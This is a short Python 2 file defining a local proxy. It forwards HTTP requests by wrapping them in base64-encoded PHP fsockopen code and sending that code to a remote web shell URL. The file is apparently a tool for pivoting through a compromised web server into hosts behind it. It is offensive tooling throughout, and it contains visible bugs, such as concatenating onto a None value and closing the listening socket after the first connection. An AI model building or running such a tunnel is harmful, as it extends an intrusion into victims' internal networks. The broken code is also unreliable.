import socket
from urlparse import urlparse
from base64 import encodestring
import request
import os
from thread import start_new_thread
from multiprocessing import Process


class Proxy(Process):
    host = ''
    port = 8888

    def set_shell_url(self, sh_url):
        self.shell_url = sh_url

    def parse_request(self, sh_url, conn):
        buff = conn.recv(24000)
        data = None
        while buff:
            data += buff
            buff = conn.recv(24000)
        if data:
            lines = data.split("\r\n")
            l1 = lines[0]
            (method, url, version) = l1.split()
            parsed_url = urlparse(url)
            if parsed_url.query:
                path_query = "{0}?{1}".format(parsed_url.path, parsed_url.query)
            else:
                path_query = parsed_url.path
            rb_request = "{0} {1} {2}\r\n".format(method, path_query, version)
            headers_str = '\r\n'.join(lines[1:])
            b64_request = encodestring("{0}{1}".format(rb_request, headers_str))
            port = parsed_url.port if parsed_url.port else 80
            php_code = """$fp = fsockopen('{0}', {1}, $errno, $errstr, 5);
                          fwrite($fp, base64_decode('{2}'));
                          while (!feof($fp)) {{ echo fgets($fp, 128); }}
                          fclose($fp);""".format(parsed_url.hostname, port, b64_request.replace(os.linesep, ""))
            b64_php_code = "param={0}".format(encodestring(php_code))
            response = request.do_request(sh_url, b64_php_code.replace(os.linesep, ""), None)
            conn.send(response)
        conn.close()

    def run(self):
        print "Starting proxy on port {0}".format(self.port)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((self.host, self.port))
        s.listen(1)
        self.run_flag = True
        while self.run_flag:
            conn, addr = s.accept()
            start_new_thread(self.parse_request, (self.shell_url, conn))
            s.close()

    def stop(self):
        self.run_flag = False
